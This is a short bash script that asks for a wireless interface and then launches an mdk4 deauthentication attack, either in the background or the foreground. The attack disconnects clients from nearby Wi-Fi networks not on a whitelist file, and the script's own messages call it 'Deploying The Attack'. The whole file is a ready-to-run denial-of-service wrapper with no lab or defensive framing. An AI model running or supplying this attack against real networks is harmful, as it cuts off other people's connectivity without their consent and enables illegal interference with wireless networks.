#!/usr/bin/bash

# Just Running iwconfig 
sudo iwconfig 

# Getting Iface Name  
echo "iface : "
read iface

# Asking User If whether To Deploy or no
echo " 1- (Yes In Background) 2- (Yes But Not In Background)  3- (no) "
read deploy

if  [ $deploy -eq 1 ] 
then

echo "Deploying The Attack ..."
sudo mdk4 $iface d -w whitelist &

elif  [ $deploy -eq 2 ]
then 

echo "Deploying The Attack ..."
sudo mdk4 $iface d -w whitelist 

fi
